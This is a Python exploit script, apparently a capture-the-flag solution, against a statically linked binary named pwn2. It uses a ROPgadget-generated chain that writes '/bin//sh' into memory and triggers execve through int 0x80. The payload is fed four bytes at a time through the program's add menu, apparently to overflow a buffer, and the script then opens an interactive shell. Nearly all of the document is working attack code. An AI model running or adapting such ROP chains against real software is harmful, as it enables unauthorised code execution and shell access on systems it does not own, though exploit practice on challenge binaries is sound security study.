# 静态编译无system，使用ROPgadget构造ROP链

from zio import *
from pwn import *
import StringIO
from struct import pack

io = zio('./pwn2')

# ROPgadget --binary ./pwn2 --ropchain
p = ''
p += pack('<I', 0x0806ed0a) # pop edx ; ret
p += pack('<I', 0x080ea060) # @ .data
p += pack('<I', 0x080bb406) # pop eax ; ret
p += '/bin'
p += pack('<I', 0x080a1dad) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806ed0a) # pop edx ; ret
p += pack('<I', 0x080ea064) # @ .data + 4
p += pack('<I', 0x080bb406) # pop eax ; ret
p += '//sh'
p += pack('<I', 0x080a1dad) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806ed0a) # pop edx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x08054730) # xor eax, eax ; ret
p += pack('<I', 0x080a1dad) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481c9) # pop ebx ; ret
p += pack('<I', 0x080ea060) # @ .data
p += pack('<I', 0x0806ed31) # pop ecx ; pop ebx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x080ea060) # padding without overwrite ebx
p += pack('<I', 0x0806ed0a) # pop edx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x08054730) # xor eax, eax ; ret
p += pack('<I', 0x0807b75f) # inc eax ; ret
p += pack('<I', 0x0807b75f) # inc eax ; ret
p += pack('<I', 0x0807b75f) # inc eax ; ret
p += pack('<I', 0x0807b75f) # inc eax ; ret
p += pack('<I', 0x0807b75f) # inc eax ; ret
p += pack('<I', 0x0807b75f) # inc eax ; ret
p += pack('<I', 0x0807b75f) # inc eax ; ret
p += pack('<I', 0x0807b75f) # inc eax ; ret
p += pack('<I', 0x0807b75f) # inc eax ; ret
p += pack('<I', 0x0807b75f) # inc eax ; ret
p += pack('<I', 0x0807b75f) # inc eax ; ret
p += pack('<I', 0x08049781) # int 0x80

#buf = 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
buf = 'A'* 44 + p32(0) + 'A' * 16 + p


io.read_until(':')
io.writeline(str(len(buf) + 10))  # need more times to choose 5.

def send_buf(buf):

	sio = StringIO.StringIO(buf)
	tmp = sio.read(4)

	while( len(tmp) == 4):
		io.read_until('result')
		io.writeline('1') # add
		int_x = u32(tmp)

		io.read_until('x:')
		io.writeline(str(int_x))
		io.read_until('y:')
		io.writeline('0')

		tmp = sio.read(4)


send_buf(buf)
io.read_until('result')
io.gdb_hint(breakpoints = [0x08048F9D])
io.writeline('5')
io.interact()

